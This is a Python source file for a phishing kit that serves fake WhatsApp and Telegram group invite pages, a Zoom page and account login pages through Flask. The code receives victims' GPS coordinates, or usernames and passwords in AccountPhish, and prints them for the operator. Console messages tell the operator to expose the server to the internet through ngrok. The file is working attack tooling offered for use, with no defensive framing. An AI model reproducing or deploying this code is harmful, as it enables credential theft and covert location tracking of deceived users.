import os

from methods import TransferImage
import sys
import logging
import json

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow

def WhatsAppPhish():
    try:
        from flask import Flask, render_template, request
        app = Flask(__name__)

        try:
            name = input("Enter your group name (Press ENTER to use default name)> ")
            image = input("Enter your group image path (Press ENTER to use default image)> ")
            if name == "":
                name = "Buddies"

            if image == "":
                image = "static/locationimages/img.jpg"

            else:
                image = TransferImage(image)

        except Exception as e:
            print(e)

        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None

        log = logging.getLogger('werkzeug').disabled = True
        print(f"{G}Serving on 127.0.0.1 at port 5000         —> [http://127.0.0.1:5000]")
        print(f"You can make web interface by using ngrok tool and using command      —> ngrok http 127.0.0.1:5000{W}")

        @app.route('/')
        def whatsapp():

            return render_template("whatsapp.html", WhatsAppImage=image, WhatsAppGroupName=name)

        @app.route('/processUserInfo/<string:info>', methods=['POST'])
        def processUserInfo(info):

            from rich.console import Console
            from rich.table import Table

            if request.method == 'POST':
                inf = json.loads(info)
                # json.dumps(info)

                print(f"{G}User Info recieved{W}")

                console = Console()
                print(f"{C}")
                print()
                table = Table(show_header=True, header_style="bold magenta")
                table.add_column("Category", style="bright", width=12)
                table.add_column("Data", style="bright", width=12)

                table.add_row("[cyan]Latitude[/cyan]", f"[green]{inf['lat']}[/green]")
                table.add_row("[cyan]Longitude[/cyan]", f"[green]{inf['lon']}[/green]")

                console.print(table)
                print(f"{W}")

                return "Info Received Successful"

            else:
                return "Failed"
    except Exception as e:
        print(f"{R}Sorry there was an error{W}")
        print(e)

    try:
        app.run(host="127.0.0.1")

    except Exception as e:
        print(e)

def TelegramPhish():
    try:
        from flask import Flask, render_template, request
        app = Flask(__name__)

        try:
            name = input("Group Name (Press ENTER to use default name)> ")
            description = input("Group Description (Press ENTER to use default description)> ")
            members = input("Number of members (Press ENTER to use default members)> ")
            image = input("Enter your group image path (Press ENTER to use default image)> ")
            if name == "":
                name = "Buddies"

            if description == "":
                description = "Welcome to our group, be respectful towards every member and feel free to dm admin for any further query\nEnjoy:)"

            if members == "":
                members = "108"

            if image == "":
                image = "static/locationimages/img.jpg"

            else:
                image = TransferImage(image)

        except Exception as e:
            print(e)

        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None

        log = logging.getLogger('werkzeug').disabled = True
        print(f"{G}Serving on 127.0.0.1 at port 5000         —> [http://127.0.0.1:5000]")
        print(f"You can make web interface by using ngrok tool and using command      —> ngrok http 127.0.0.1:5000{W}")

        @app.route('/')
        def telegram():

            return render_template("telegram.html", TelegramImage=image, TelegramGroupName=name,
                                   TelegramDescription=description, TelegramMembers=members)

        @app.route('/processUserInfo/<string:info>', methods=['POST'])
        def processUserInfo(info):

            from rich.console import Console
            from rich.table import Table

            if request.method == 'POST':
                inf = json.loads(info)
                # json.dumps(info)

                print(f"{G}User Info recieved{W}")

                console = Console()
                print(f"{C}")
                print()
                table = Table(show_header=True, header_style="bold magenta")
                table.add_column("Category", style="bright", width=12)
                table.add_column("Data", style="bright", width=12)

                table.add_row("[cyan]Latitude[/cyan]", f"[green]{inf['lat']}[/green]")
                table.add_row("[cyan]Longitude[/cyan]", f"[green]{inf['lon']}[/green]")

                console.print(table)
                print(f"{W}")

                return "Info Received Successful"

            else:
                return "Failed"
    except Exception as e:
        print(f"{R}Sorry there was an error{W}")
        print(e)

    try:
        app.run(host="127.0.0.1")

    except Exception as e:
        print(e)


def ZoomPhish():
    try:
        from flask import Flask, render_template, request
        app = Flask(__name__)

        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None

        log = logging.getLogger('werkzeug').disabled = True
        print(f"{G}Serving on 127.0.0.1 at port 5000         —> [http://127.0.0.1:5000]")
        print(f"You can make web interface by using ngrok tool and using command      —> ngrok http 127.0.0.1:5000{W}")

        @app.route('/')
        def Zoom():

            return render_template("zoom.html")

        @app.route('/processUserInfo/<string:info>', methods=['POST'])
        def processUserInfo(info):

            from rich.console import Console
            from rich.table import Table

            if request.method == 'POST':
                inf = json.loads(info)
                # json.dumps(info)

                print(f"{G}User Info recieved{W}")

                console = Console()
                print(f"{C}")
                print()
                table = Table(show_header=True, header_style="bold magenta")
                table.add_column("Category", style="bright", width=12)
                table.add_column("Data", style="bright", width=12)

                table.add_row("[cyan]Latitude[/cyan]", f"[green]{inf['lat']}[/green]")
                table.add_row("[cyan]Longitude[/cyan]", f"[green]{inf['lon']}[/green]")

                console.print(table)
                print(f"{W}")

                return "Info Received Successful"

            else:
                return "Failed"
    except Exception as e:
        print(f"{R}Sorry there was an error{W}")
        print(e)

    try:
        app.run(host="127.0.0.1")

    except Exception as e:
        print(e)


def AccountPhish(template):

    try:
        from flask import Flask, render_template, request

        app = Flask(__name__)

        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None

        log = logging.getLogger('werkzeug').disabled = True
        print(f"{G}Serving on 127.0.0.1 at port 5000         —> [http://127.0.0.1:5000]")
        print(f"You can make web interface by using ngrok tool and using command      —> ngrok http 127.0.0.1:5000{W}")

        @app.route('/')
        def Phish():

            return render_template(template)

        @app.route('/processUserInfo/<string:info>', methods=['POST'])
        def processUserInfo(info):

            from rich.console import Console
            from rich.table import Table

            if request.method == 'POST':
                inf = json.loads(info)
                # json.dumps(info)

                print(f"{G}User Info recieved{W}")

                console = Console()
                print(f"{C}")
                print()
                table = Table(show_header=True, header_style="bold magenta")
                table.add_column("Category", style="bright", width=12)
                table.add_column("Data", style="bright", width=20)

                table.add_row("[cyan]Username[/cyan]", f"[green]{inf['username']}[/green]")
                table.add_row("[cyan]Password[/cyan]", f"[green]{inf['password']}[/green]")

                console.print(table)
                print(f"{W}")

                return "Info Received Successful"

            else:
                return "Failed"
    except Exception as e:
        print(f"{R}Sorry there was an error{W}")
        print(e)

    try:
        app.run(host="127.0.0.1")

    except Exception as e:
        print(e)
